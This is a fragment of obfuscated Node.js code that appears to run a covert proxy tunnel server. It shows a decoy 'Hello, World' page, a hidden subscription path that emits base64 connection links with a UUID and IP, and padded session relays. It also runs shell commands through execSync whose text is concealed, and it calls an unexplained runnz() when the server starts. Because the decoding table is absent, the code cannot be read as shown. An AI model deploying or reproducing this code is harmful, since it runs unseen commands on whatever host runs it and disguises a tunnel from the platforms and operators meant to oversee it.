IP=DOMAIN;if(!DOMAIN)try{IP=execSync(_0x736777(0x1b8),{'encoding':_0x736777(0x1f8)})[_0x736777(0x185)]();}catch(_0x5d79a7){try{IP='['+execSync(_0x736777(0x15d),{'encoding':'utf-8'})['trim']()+']';}catch(_0x413e95){log(_0x736777(0x168),_0x736777(0x16d),_0x413e95[_0x736777(0x147)]),IP=_0x736777(0x17f);}}const server=http[_0x736777(0x1b3)]((_0x1d3b2a,_0x1b5cd0)=>{const _0x32ffb1=_0x736777,_0x3f43b0={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':'GET,\x20POST','Cache-Control':'no-store','X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x1d3b2a[_0x32ffb1(0x1be)]==='/'){_0x1b5cd0[_0x32ffb1(0x1e1)](0xc8,{'Content-Type':'text/plain'}),_0x1b5cd0['end']('Hello,\x20World\x0a');return;}if(_0x1d3b2a[_0x32ffb1(0x1be)]==='/'+SUB_PATH){const _0x51758f=_0x32ffb1(0x167)+UUID+'@'+IP+_0x32ffb1(0x19a)+IP+_0x32ffb1(0x1fd)+IP+_0x32ffb1(0x1ff)+SETTINGS[_0x32ffb1(0x16f)]+_0x32ffb1(0x1ad)+ISP+'-'+NAME,_0x54dd02=Buffer[_0x32ffb1(0x1f2)](_0x51758f)[_0x32ffb1(0x188)]('base64');_0x1b5cd0[_0x32ffb1(0x1e1)](0xc8,{'Content-Type':_0x32ffb1(0x13e)}),_0x1b5cd0[_0x32ffb1(0x1ac)](_0x54dd02+'\x0a');return;}const _0x542a73=_0x1d3b2a[_0x32ffb1(0x1be)][_0x32ffb1(0x195)](new RegExp(XPATH+'/([^/]+)(?:/([0-9]+))?$'));if(!_0x542a73){_0x1b5cd0[_0x32ffb1(0x1e1)](0x194),_0x1b5cd0[_0x32ffb1(0x1ac)]();return;}const _0x18bb94=_0x542a73[0x1],_0x416866=_0x542a73[0x2]?parseInt(_0x542a73[0x2]):null;if(_0x1d3b2a[_0x32ffb1(0x131)]===_0x32ffb1(0x17c)&&!_0x416866){_0x3f43b0[_0x32ffb1(0x1aa)]=_0x32ffb1(0x1bc),_0x3f43b0[_0x32ffb1(0x1d4)]=_0x32ffb1(0x14a);let _0x4b8c70=sessions[_0x32ffb1(0x1de)](_0x18bb94);!_0x4b8c70&&(_0x4b8c70=new Session(_0x18bb94),sessions[_0x32ffb1(0x1dd)](_0x18bb94,_0x4b8c70),log('info','Created\x20new\x20session\x20for\x20GET:\x20'+_0x18bb94));_0x4b8c70[_0x32ffb1(0x1cb)]=!![];!_0x4b8c70[_0x32ffb1(0x1c7)](_0x1b5cd0,_0x3f43b0)&&(log(_0x32ffb1(0x168),_0x32ffb1(0x1f4)+_0x18bb94),!_0x1b5cd0[_0x32ffb1(0x178)]&&(_0x1b5cd0['writeHead'](0x1f4),_0x1b5cd0[_0x32ffb1(0x1ac)]()),_0x4b8c70['cleanup'](),sessions[_0x32ffb1(0x1a1)](_0x18bb94));return;}if(_0x1d3b2a[_0x32ffb1(0x131)]===_0x32ffb1(0x1f9)&&_0x416866!==null){let _0x5ed756=sessions[_0x32ffb1(0x1de)](_0x18bb94);!_0x5ed756&&(_0x5ed756=new Session(_0x18bb94),sessions[_0x32ffb1(0x1dd)](_0x18bb94,_0x5ed756),log('info',_0x32ffb1(0x16c)+_0x18bb94),setTimeout(()=>{const _0x7dd85d=_0x32ffb1,_0x1f9fa9=sessions[_0x7dd85d(0x1de)](_0x18bb94);_0x1f9fa9&&!_0x1f9fa9['downstreamStarted']&&(log(_0x7dd85d(0x15f),_0x7dd85d(0x1e4)+_0x18bb94+_0x7dd85d(0x19f)),_0x1f9fa9[_0x7dd85d(0x12c)](),sessions[_0x7dd85d(0x1a1)](_0x18bb94));},SETTINGS[_0x32ffb1(0x171)]));let _0x5abea7=[],_0x5cd508=0x0,_0x933f77=![];_0x1d3b2a['on'](_0x32ffb1(0x1e3),_0x205e1d=>{const _0x273e4b=_0x32ffb1;_0x5cd508+=_0x205e1d[_0x273e4b(0x169)];if(_0x5cd508>SETTINGS[_0x273e4b(0x14f)]){!_0x933f77&&(_0x1b5cd0[_0x273e4b(0x1e1)](0x19d),_0x1b5cd0['end'](),_0x933f77=!![]);return;}_0x5abea7[_0x273e4b(0x140)](_0x205e1d);}),_0x1d3b2a['on'](_0x32ffb1(0x1ac),async()=>{const _0x53897d=_0x32ffb1;if(_0x933f77)return;try{const _0x4d3be9=Buffer[_0x53897d(0x186)](_0x5abea7);log(_0x53897d(0x138),_0x53897d(0x1da)+_0x416866+',\x20size='+_0x4d3be9[_0x53897d(0x169)]),await _0x5ed756[_0x53897d(0x197)](_0x416866,_0x4d3be9),!_0x933f77&&(_0x1b5cd0[_0x53897d(0x1e1)](0xc8,_0x3f43b0),_0x933f77=!![]),_0x1b5cd0[_0x53897d(0x1ac)]();}catch(_0x45575f){log(_0x53897d(0x168),_0x53897d(0x13c)+_0x45575f[_0x53897d(0x147)]),_0x5ed756[_0x53897d(0x12c)](),sessions[_0x53897d(0x1a1)](_0x18bb94),!_0x933f77&&(_0x1b5cd0['writeHead'](0x1f4),_0x933f77=!![]),_0x1b5cd0[_0x53897d(0x1ac)]();}});return;}_0x1b5cd0[_0x32ffb1(0x1e1)](0x194),_0x1b5cd0['end']();});server['on']('secureConnection',_0x183efc=>{const _0x5ae5d3=_0x736777;log('debug',_0x5ae5d3(0x1d6)+(_0x183efc[_0x5ae5d3(0x201)]||_0x5ae5d3(0x18d)));});function _0x8e35(_0x32c75b,_0x2de53e){const _0x2f67ab=_0x1b86();return _0x8e35=function(_0x260b56,_0x51297c){_0x260b56=_0x260b56-0x12c;let _0x979b8e=_0x2f67ab[_0x260b56];return _0x979b8e;},_0x8e35(_0x32c75b,_0x2de53e);}function generatePadding(_0x59e163,_0x38aa73){const _0x49cf80=_0x736777,_0x80397b=_0x59e163+Math[_0x49cf80(0x14e)](Math[_0x49cf80(0x177)]()*(_0x38aa73-_0x59e163));return Buffer[_0x49cf80(0x1f2)](Array(_0x80397b)[_0x49cf80(0x15b)]('X')[_0x49cf80(0x1ef)](''))[_0x49cf80(0x188)](_0x49cf80(0x1d1));}server['keepAliveTimeout']=0x975e0,server['headersTimeout']=0x98968,server['on'](_0x736777(0x168),_0x53d8d7=>{const _0x561cd5=_0x736777;log('error','Server\x20error:\x20'+_0x53d8d7[_0x561cd5(0x147)]);}),server[_0x736777(0x1b5)](PORT,()=>{const _0x2575d8=_0x736777;runnz(),console['log'](_0x2575d8(0x193)+PORT);});
